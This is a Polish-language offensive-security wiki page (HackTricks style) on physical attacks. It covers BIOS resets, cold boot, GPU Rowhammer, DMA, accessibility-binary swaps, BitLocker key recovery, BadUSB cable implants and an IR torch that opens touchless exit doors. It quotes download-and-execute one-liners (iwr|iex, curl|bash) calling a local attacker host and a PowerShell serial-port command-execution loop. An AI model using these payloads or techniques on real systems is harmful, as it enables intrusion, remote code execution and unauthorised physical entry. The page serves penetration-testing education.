# Ataki fizyczne

{{#include ../banners/hacktricks-training.md}}

## Odzyskiwanie hasła BIOS i bezpieczeństwo systemu

Ustawienia starszego firmware'u komputerów PC można zresetować przez odłączenie baterii CMOS lub użycie udokumentowanej zworki clear-CMOS. Wymagany czas odłączenia zasilania zależy od płyty głównej, a współczesne hasła lub klucze UEFI mogą być przechowywane w nieulotnej pamięci flash, kontrolerze embedded albo urządzeniu zabezpieczającym i dlatego przetrwać wyjęcie baterii. Przed zwarciem pinów zapoznaj się z instrukcją płyty głównej lub serwisową; procedura ta może również unieważnić pomiary TPM i wywołać odzyskiwanie szyfrowania dysku.

W starszych systemach x86 narzędzia takie jak **killCMOS** i **CmosPwd** mogą z poziomu środowiska rozruchowego sprawdzać lub modyfikować ustawienia przechowywane w CMOS. CmosPwd rozpoznaje formaty haseł z udokumentowanego zestawu starszych rodzin BIOS i może tworzyć kopie zapasowe, przywracać lub usuwać/zabijać stan CMOS; jego opublikowane kompilacje są przeznaczone dla środowisk legacy DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Narzędzia te nie są uniwersalnymi narzędziami do usuwania haseł UEFI i wymagają odpowiedniego dostępu do sprzętu lub firmware'u.

Niektóre firmware'y laptopów wyświetlają kod wyzwania specyficzny dla producenta po kilku nieudanych próbach podania hasła. Bazy danych takie jak [bios-pw.org](https://bios-pw.org) mogą dla niektórych modeli wyprowadzić starsze hasła odzyskiwania producenta, jednak wiele systemów stosuje blokadę bez możliwego do wyprowadzenia kodu wyzwania. Każde wygenerowane hasło traktuj jako specyficzne dla danego modelu i unikaj wyczerpania liczników prób, których nie można zresetować.

### Bezpieczeństwo UEFI

W przypadku współczesnych systemów **UEFI** CHIPSEC może przeprowadzać audyt zabezpieczeń zmiennych Secure Boot. Rozpocznij od poniższego testu niemodyfikującego; opcjonalny tryb `-a modify` celowo próbuje uszkodzić zmienne i powinien być używany wyłącznie na systemie laboratoryjnym, który można odzyskać. Sam CHIPSEC ostrzega, że jego uprzywilejowany sterownik i dostęp do sprzętu niskiego poziomu nie są odpowiednie dla endpointów produkcyjnych.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Analiza RAM i ataki Cold Boot

DRAM nie traci każdego bitu natychmiast po zatrzymaniu odświeżania. Tempo zaniku danych znacznie różni się w zależności od technologii modułu i temperatury; chłodzenie może zachować użyteczne dane znacznie dłużej niż niechłodzony cykl wyłączenia i ponownego uruchomienia. Atak cold-boot szybko uruchamia system ponownie w niewielkim środowisku akwizycji lub przenosi schłodzony moduł, przechwytuje surową pamięć i rekonstruuje klucze kryptograficzne mimo zaniku bitów. Narzędzie do kopiowania dysków nie jest automatycznie narzędziem do obrazowania pamięci fizycznej, a Volatility analizuje przechwycony obraz, zamiast go pozyskiwać; należy używać odpowiedniego dla danej platformy, zweryfikowanego narzędzia do akwizycji.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer przeciwko tablicom stron

Współczesne ataki GPU Rowhammer stają się znacznie bardziej użyteczne, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Najnowsze prace dotyczące **układów GPU GDDR6 NVIDIA Ampere** pokazują, że atakujący wykonujący nieuprzywilejowany kod CUDA może tworzyć specyficzne dla GPU wzorce hammeringu, używać **memory massaging** do umieszczania struktur stronicowania w podatnych wierszach, a następnie odwracać bity w **tablicy stron ostatniego poziomu** lub pośrednim **katalogu stron**. Po uszkodzeniu pojedynczego wpisu translacji atakujący może uzyskać **dowolny odczyt/zapis pamięci GPU**, a następnie przejść do kompromitacji hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Wzorzec eksploatacji

1. **Profilowanie wierszy podatnych na hammering** w GDDR6 i tworzenie uwzględniających odświeżanie / niejednorodnych wzorców hammeringu, które omijają zabezpieczenia implementowane w DRAM.
2. **Memory massaging alokacji GPU**, aby sterownik umieszczał struktury translacji stron w podatnych lokalizacjach fizycznych, zamiast przechowywać je w domyślnej chronionej puli. W praktyce może to oznaczać wyczerpanie regionu tablic stron w pamięci niskiego adresu oraz rozrzucenie dużych, rzadkich mapowań UVM z kontrolowanymi odstępami.
3. **Odwracanie bitów metadanych translacji**, takich jak **PFN** lub bitów związanych z aperturą, wewnątrz wpisu tablicy stron / katalogu stron, aby kontrolowana przez atakującego strona wirtualna wskazywała na strony tablic stron, dowolną pamięć GPU lub widoczne dla hosta mapowania systemowe.
4. Ponowne użycie sfałszowanego mapowania do nadpisywania kolejnych wpisów translacji i eskalacja do **dowolnego odczytu/zapisu pamięci GPU** w różnych kontekstach GPU.

### Przejście do hosta i zabezpieczenia

- Przy **wyłączonym IOMMU** sfałszowane mapowania apertury systemowej mogą udostępnić GPU dowolną **fizyczną pamięć hosta**, zmieniając prymityw GPU w pełną kompromitację hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** atakuje wpisy tablic stron ostatniego poziomu, natomiast **GeForge** pokazuje, że uszkodzenie poziomu katalogu stron może być łatwiejsze, ponieważ pojedyncze odwrócenie bitu może przekierować większe poddrzewo translacji. Nie należy traktować tylko jednej warstwy stronicowania jako krytycznej z punktu widzenia bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośrednią ścieżkę do dowolnej pamięci hosta wykorzystywaną przez GDDRHammer/GeForge, ale **nie jest kompletnym zabezpieczeniem**. **GPUBreach** pokazuje przejście drugiego etapu, w którym atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci sterownika NVIDIA, aby uzyskać prymityw zapisu do kernela i **root shell** nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
- **ECC na poziomie systemu** jest praktycznym krokiem hardeningu na obsługiwanych GPU dla workstation/server. Konsumenckie GPU bez ECC udostępniają słabszą powierzchnię obrony.<sup>[[4]](#references)</sup>
- Ataki te nie są wyłącznie teoretyczne: **GeForge** odnotował **1171** odwróceń bitów na RTX 3060 oraz **202** na RTX A6000, co wystarczyło do zbudowania działającego łańcucha eskalacji uprawnień hosta.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataki Direct Memory Access (DMA)

W przypadku offline patchowania UEFI IFR/NVRAM, które może obniżyć poziom egzekwowania IOMMU przed uruchomieniem systemu i umożliwić łańcuch DMA w Windows, zobacz:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstruje pozyskiwanie i patchowanie pamięci za pomocą **DMA** przez interfejsy takie jak FireWire i wczesne konfiguracje Thunderbolt, w tym historyczne sygnatury omijania logowania. Nie jest po prostu „nieskuteczny przeciwko Windows 10”: możliwość eksploatacji zależy od interfejsu, builda systemu, zasad IOMMU, stanu blokady oraz tego, czy Windows Kernel DMA Protection jest obsługiwane i włączone. Windows 10 w wersji 1803 i nowszych wprowadził Kernel DMA Protection na kompatybilnych platformach, znacząco zmieniając powierzchnię ataku.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB do uzyskania dostępu do systemu

Na niezaszyfrowanym lub już odblokowanym woluminie Windows środowisko offline może zastąpić pliki binarne ułatwień dostępu, takie jak **sethc.exe** lub **Utilman.exe**, plikiem **cmd.exe**, uzyskując wiersz poleceń SYSTEM po użyciu odpowiedniego skrótu na ekranie logowania. Narzędzia takie jak **chntpw** mogą edytować dane lokalnych kont SAM. Metody te nie omijają zablokowanego woluminu BitLocker i mogą uszkodzić dane uwierzytelniające chronione przez DPAPI/EFS; należy zachować kopie forensic oraz kopie zapasowe.

**Kon-Boot** jest komercyjnym narzędziem do omijania uwierzytelniania podczas uruchamiania dla obsługiwanych konfiguracji Windows/macOS. Kompatybilność zależy od systemu operacyjnego, trybu firmware, Secure Boot i konfiguracji szyfrowania dysku; narzędzie nie odszyfrowuje woluminu zablokowanego przez BitLocker.<sup>[[10]](#references)</sup>

---

## Obsługa funkcji bezpieczeństwa Windows

### Skróty uruchamiania i odzyskiwania

- **Delete/Supr**, F2, F10 lub inny klawisz producenta może otworzyć konfigurację firmware.
- **F8** uruchamia starsze zaawansowane opcje rozruchu Windows tylko w konfiguracjach, w których ta ścieżka pozostaje włączona; sposób wejścia do bieżącego środowiska odzyskiwania jest różny.
- Przytrzymanie klawisza **Shift** może wyłączyć automatyczne logowanie Windows w niektórych konfiguracjach, chociaż zasady/rejestr mogą wyłączyć to zachowanie.<sup>[[17]](#references)</sup>

### Urządzenia BAD USB

Urządzenia takie jak **USB Rubber Ducky** i płytki Teensy mogą zgłaszać się jako zaufane klawiatury HID i wstrzykiwać wcześniej zdefiniowane naciśnięcia klawiszy. Payload początkowo ma uprawnienia i dostęp do pulpitu zalogowanej sesji; monity UAC, blokada ekranu, układ klawiatury, synchronizacja czasowa i zasady USB endpointu nadal go ograniczają.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Uprawnienia administratora lub backupu mogą umożliwić utworzenie shadow copy albo zapisanie hive'ów rejestru, dzięki czemu można pozyskać zablokowane pliki, takie jak **SAM** i **SYSTEM**. Jest to technika zbierania danych po kompromitacji, a nie obejście eskalacji uprawnień; zdarzenia te należy korelować z operacjami `diskshadow`/VSS i eksportem hive'ów rejestru.

## Techniki implantów BadUSB / HID

### Implanty kablowe zarządzane przez Wi-Fi

- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, ukrywają się wewnątrz kabli USB-A→USB-C lub USB-C↔USB-C, zgłaszają się wyłącznie jako klawiatura USB i udostępniają swój stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` i haśle `123456789`, a następnie przejść do [http://cable-wind.local/](http://cable-wind.local/) (lub jego adresu DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
- Interfejs przeglądarkowy udostępnia karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane payloady są oznaczane według systemu operacyjnego, układy klawiatury są przełączane w locie, a ciągi VID/PID można zmieniać, aby naśladować znane urządzenia peryferyjne.
- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotowywać payloady, uruchamiać ich wykonanie i zarządzać poświadczeniami Wi-Fi bez używania sieci organizacji — jest to przydatne podczas krótkotrwałych fizycznych włamań.

### Payloady AutoExec rozpoznające system operacyjny

- Reguły AutoExec wiążą jeden lub więcej payloadów z natychmiastowym uruchomieniem po enumeracji USB. Implant wykonuje lekkie rozpoznanie systemu operacyjnego i wybiera pasujący skrypt.
- Przykładowy przebieg:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie jest unattended, sama zamiana kabla do ładowania może zapewnić początkowy dostęp „plug-and-pwn” w kontekście zalogowanego użytkownika.

### Zdalny shell przez Wi-Fi TCP uruchamiany za pomocą HID

1. **Bootstrap za pomocą naciśnięć klawiszy:** Zapisany payload otwiera konsolę i wkleja pętlę wykonującą wszystko, co pojawi się na nowym urządzeniu szeregowym USB. Minimalny wariant dla Windows to:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, APK Androida lub plik wykonywalny na komputerze) łączącego się zwrotnie z operatorem. Wszystkie bajty wpisane w sesji TCP są przekazywane do powyższej pętli szeregowej, zapewniając zdalne wykonywanie poleceń nawet na hostach odłączonych od sieci. Dane wyjściowe są ograniczone, dlatego operatorzy zazwyczaj wykonują polecenia w ciemno (tworzenie kont, przygotowanie dodatkowych narzędzi itp.).

### Powierzchnia aktualizacji HTTP OTA

- Udokumentowany interfejs Evil Crow Cable Wind udostępnia nieuwierzytelniony endpoint aktualizacji firmware'u pod adresem `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Operatorzy terenowi mogą dynamicznie zmieniać funkcje (np. wgrywać firmware flash USB Army Knife) w trakcie operacji, bez otwierania kabla, dzięki czemu implant może przełączać się na nowe możliwości, pozostając podłączonym do hosta docelowego.

## Omijanie szyfrowania BitLocker

Autoryzowane pozyskanie danych śledczych z działającego lub niedawno uruchomionego systemu może zawierać główny klucz woluminu BitLocker albo powiązany materiał kluczowy, gdy wolumin jest odblokowany. Komercyjne narzędzia, takie jak Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic, mogą przeszukiwać obsługiwane obrazy pamięci, pliki hibernacji lub zrzuty awaryjne, ale powodzenie nie jest gwarantowane. Współczesny Windows szyfruje również zrzuty awaryjne, gdy BitLocker jest włączony, a przechowywane 48-cyfrowe hasło odzyskiwania jest innym artefaktem niż klucz woluminu znajdujący się w pamięci.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Inżynieria społeczna w celu dodania klucza odzyskiwania

Atakujący, który przekona administratora do uruchomienia poleceń zarządzania BitLockerem, może dodać hasło odzyskiwania, klucz zewnętrzny lub inny protector, a następnie go przechwycić. Hasło odzyskiwania nie może być dowolnym ciągiem zer: numeryczne hasła odzyskiwania BitLocker mają zweryfikowany format 48 cyfr. Odpowiednia składnia autoryzowanej administracji to `manage-bde -protectors -add C: -recoverypassword`; listę wynikowych protectorów można wyświetlić za pomocą `manage-bde -protectors -get C:`. Należy monitorować dodawanie protectorów i upewnić się, że nowy materiał odzyskiwania jest przechowywany wyłącznie w zatwierdzonych lokalizacjach.<sup>[[16]](#references)</sup>

---

## Wykorzystanie przełączników naruszenia obudowy / konserwacyjnych do przywrócenia BIOS-u do ustawień fabrycznych

Wiele współczesnych laptopów i komputerów stacjonarnych w obudowach small-form-factor zawiera **przełącznik naruszenia obudowy**, monitorowany przez Embedded Controller (EC) oraz firmware BIOS/UEFI. Chociaż podstawowym celem przełącznika jest wywołanie alertu po otwarciu urządzenia, producenci czasami implementują **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu przełącznika w określony sposób.<sup>[[5]](#references)[[6]](#references)</sup>

### Jak działa atak

1. Przełącznik jest podłączony do **przerwania GPIO** w EC.
2. Firmware działający w EC śledzi **czas i liczbę naciśnięć**.
3. Po rozpoznaniu zakodowanego wzorca EC wywołuje procedurę *mainboard-reset*, która **usuwa zawartość systemowego NVRAM/CMOS**.
4. Przy następnym uruchomieniu modele, których dotyczy problem, wczytują zresetowany stan firmware. W zależności od producenta i wersji wyczyszczony stan może obejmować hasło administratora, niestandardowe ustawienia rozruchu lub zarejestrowane klucze Secure Boot; stan TPM i skutki dla szyfrowania dysku należy ocenić osobno.

> Reset firmware może przywrócić opcje uruchamiania z nośników zewnętrznych, ale **nie odszyfrowuje pamięci masowej**. BitLocker lub inny system pełnego szyfrowania dysku może przejść w tryb odzyskiwania po zmianach TPM/firmware i nadal chronić dysk wewnętrzny bez klucza odzyskiwania.<sup>[[16]](#references)</sup>

### Przykład z rzeczywistego świata – laptop Framework 13

Skrót odzyskiwania dla Framework 13 (11./12./13. generacji) to:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Po dziesiątym cyklu układ EC ustawia flagę, która instruuje BIOS, aby przy następnym restarcie wyczyścił pamięć NVRAM. Cała procedura trwa około 40 s i wymaga **wyłącznie śrubokręta**.<sup>[[5]](#references)</sup>

### Ogólna procedura Exploitation

1. Włącz urządzenie albo uśpij je i wybudź, aby układ EC działał.
2. Zdejmij dolną pokrywę, aby uzyskać dostęp do przełącznika wykrywania ingerencji/konserwacyjnego.
3. Odtwórz specyficzną dla dostawcy sekwencję przełączania (sprawdź dokumentację, fora lub wykonaj reverse-engineering firmware układu EC).
4. Złóż urządzenie i uruchom je ponownie, a następnie sprawdź, które ustawienia firmware i dane uwierzytelniające faktycznie się zmieniły.
5. Jeśli jest to autoryzowane i dostępne jest uruchamianie z nośnika zewnętrznego, uruchom kontrolowany obraz live. Po legalnym odblokowaniu woluminu wewnętrznego (lub jeśli nigdy nie był szyfrowany) środowisko live może pozyskać dane uwierzytelniające i dane albo przeanalizować EFI System Partition. Modyfikowanie tej partycji w celu instalacji implantu EFI jest trwałe i bardzo inwazyjne, a ponadto ograniczają je Secure Boot, measured boot, ochrona firmware przed zapisem oraz monitoring endpointów. Zaszyfrowana pamięć masowa pozostaje niedostępna bez klucza lub materiału odzyskiwania.

### Wykrywanie i ograniczanie skutków

* Rejestruj zdarzenia ingerencji w obudowę w konsoli zarządzania systemem operacyjnym i koreluj je z nieoczekiwanymi resetami BIOS.
* Stosuj **plomby zabezpieczające przed manipulacją** na śrubach/pokrywach, aby wykrywać otwarcie.
* Przechowuj urządzenia w **fizycznie kontrolowanych obszarach**; zakładaj, że dostęp fizyczny oznacza pełne przejęcie.
* Jeśli jest to możliwe, wyłącz funkcję dostawcy „resetu przełącznikiem konserwacyjnym” albo wymagaj dodatkowej autoryzacji kryptograficznej dla resetów NVRAM.

---

## Covert IR Injection przeciwko bezdotykowym czujnikom wyjścia

### Charakterystyka czujnika
- Dostępne na rynku czujniki „wave-to-exit” łączą emiter diody near-IR z modułem odbiornika w stylu pilota telewizyjnego, który zgłasza stan logic high dopiero po wykryciu wielu impulsów (około 4–10) właściwej częstotliwości nośnej (około 30 kHz).<sup>[[7]](#references)</sup>
- Plastikowa osłona uniemożliwia bezpośrednie patrzenie emitera i odbiornika na siebie, więc kontroler zakłada, że każdy zweryfikowany sygnał nośny pochodzi z pobliskiego odbicia, i steruje przekaźnikiem otwierającym zamek drzwi.
- Gdy kontroler uzna, że cel jest obecny, często zmienia obwiednię modulacji sygnału wychodzącego, ale odbiornik nadal akceptuje każdy impuls odpowiadający odfiltrowanej częstotliwości nośnej.

### Przebieg ataku
1. **Przechwyć profil emisji** – podłącz analizator stanów logicznych do pinów kontrolera, aby zarejestrować zarówno przebiegi przed wykryciem, jak i po wykryciu, które sterują wewnętrzną diodą LED IR.
2. **Odtwórz wyłącznie przebieg „po wykryciu”** – odłącz lub pomiń fabryczny emiter i od początku steruj zewnętrzną diodą LED IR już wyzwolonym wzorcem. Ponieważ odbiornik sprawdza jedynie liczbę impulsów/częstotliwość, traktuje sfałszowany sygnał nośny jak prawdziwe odbicie i aktywuje linię przekaźnika.
3. **Steruj transmisją** – transmituj sygnał nośny w dostrojonych impulsach (np. przez dziesiątki milisekund włączony i przez podobny czas wyłączony), aby dostarczyć minimalną liczbę impulsów bez nasycania układu AGC odbiornika ani jego logiki obsługi zakłóceń. Ciągła emisja szybko zmniejsza czułość czujnika i uniemożliwia zadziałanie przekaźnika.

### Zdalna iniekcja z wykorzystaniem odbić
- Zastąpienie laboratoryjnej diody LED wysokiej mocy diodą IR, sterownikiem MOSFET i optyką skupiającą umożliwia niezawodne wyzwalanie z odległości około 6 m.
- Atakujący nie potrzebuje linii widzenia do apertury odbiornika; skierowanie wiązki na wewnętrzne ściany, regały lub framugi drzwi widoczne przez szybę pozwala odbitej energii wejść w pole widzenia o kącie około 30° i naśladować machnięcie dłoni z bliska.
- Ponieważ odbiorniki oczekują jedynie słabych odbić, znacznie silniejsza wiązka zewnętrzna może odbić się od wielu powierzchni i nadal pozostać powyżej progu detekcji.

### Weaponised Attack Torch
- Umieszczenie sterownika wewnątrz komercyjnej latarki ukrywa narzędzie na widoku. Wymień widoczną diodę LED na wysokiej mocy diodę IR dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny układ) do generowania impulsów o częstotliwości około 30 kHz i użyj MOSFET-a do odprowadzania prądu diody LED.
- Teleskopowa soczewka z zoomem zawęża wiązkę, zwiększając zasięg/precyzję, a silnik wibracyjny sterowany przez MCU zapewnia haptyczne potwierdzenie aktywnej modulacji bez emisji światła widzialnego.
- Przełączanie między kilkoma zapisanymi wzorcami modulacji (z nieco różnymi częstotliwościami nośnymi i obwiedniami) zwiększa kompatybilność z różnymi rodzinami czujników sprzedawanych pod innymi markami, pozwalając operatorowi przeszukiwać powierzchnie odbijające, aż przekaźnik wyraźnie kliknie i drzwi się otworzą.

---

## References

- [1] [GDDRHammer: Silne zakłócanie wierszy DRAM — ataki Rowhammer między komponentami z użyciem nowoczesnych GPU](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Silne zakłócanie pamięci GDDR w celu tworzenia tablic stron GPU dla zabawy i zysku](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Ataki eskalacji uprawnień na GPU z użyciem Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - lipiec 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Naciśnij tutaj, aby przejąć”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – przewodnik resetowania płyty głównej](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Noooooooo Touch! – Omijanie bezdotykowych czujników wyjścia IR za pomocą ukrytej latarki IR”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Podłącz, uruchom, przejmij: hacking z użyciem Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - atak Rowhammer na układy NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Oficjalna dokumentacja Kon-Boot i informacje o kompatybilności](https://kon-boot.com/)
- [11] [Dokumentacja CHIPSEC - zabezpieczenia zmiennych Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: ataki Cold Boot na klucze szyfrujące](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulowanie pamięcią fizyczną przez DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentacja Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - przewodnik po operacjach BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - przytrzymanie klawisza Shift i zachowanie automatycznego logowania](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - dokumentacja i pliki do pobrania CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
